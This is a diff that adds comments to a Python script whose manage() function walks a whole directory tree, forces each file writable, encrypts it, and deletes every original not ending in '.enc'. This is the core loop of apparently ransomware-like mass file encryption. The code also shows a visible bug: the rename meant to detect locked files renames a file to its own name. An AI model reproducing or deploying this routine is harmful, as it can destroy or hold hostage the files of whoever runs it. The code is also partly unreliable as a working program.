@@ -81,33 +81,37 @@ def decrypt_file(key, in_filename, out_filename, chunksize):
 def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
     #TODO, find a way to optimize this
     
-    filesChanged = 0
+    filesChanged = 0#stats for testing
     filesInUse = 0
     permissionDenied = 0
     unDeleteable = 0
     dontKnow = 0
     deleted = 0
     times = 0
-    for subdir, dirs, files in os.walk(rootDirectionary):
+    
+    for subdir, dirs, files in os.walk(rootDirectionary):#goes through the directory
         for file in files:
             
             
-            filename = os.path.join(subdir, file)
+            filename = os.path.join(subdir, file)#this makes the filename include its path
+            #windows will throw an error if you just tell it to delete/access example.txt
             
-            try:
+            
+            try:#this is not needed actually...
                 
                 print(filename)
                 newFile = file
                 newFile += "a"    
                 newFilename = os.path.join(subdir, file)
                 try:
-                    os.rename(filename, newFilename)
+                    os.rename(filename, newFilename)#checks if file in use by OS
+                    
                 except:
                     print("File is in use.")
                     filesInUse +=1
                     continue
                 try:
-                    os.chmod(filename, stat.S_IWRITE)
+                    os.chmod(filename, stat.S_IWRITE)#makes file writable if its read only
                     os.chmod(filename, stat.S_IWUSR)
                 except:
                     times +=1
@@ -116,7 +120,7 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                 print("dont know")
                 dontKnow += 1
                 continue    
-            os.rename(newFilename, filename)
+            os.rename(newFilename, filename)#returns the file to its original name
             
             
                 
@@ -131,11 +135,11 @@ def manage(function, rootDirectionary, key):#0 encrypt | 1 decrypt
                     try: 
                         
                         
-                        if not ".enc" in filename:
+                        if not ".enc" in filename:#deletes the un-encrypted files
                             os.remove(filename)
                             deleted += 1
                             
-                    except OSError:
+                    except OSError:#sometimes windows wont let you delete something
                             print("cant delete :(")
                             unDeleteable += 1
             elif function == 1:
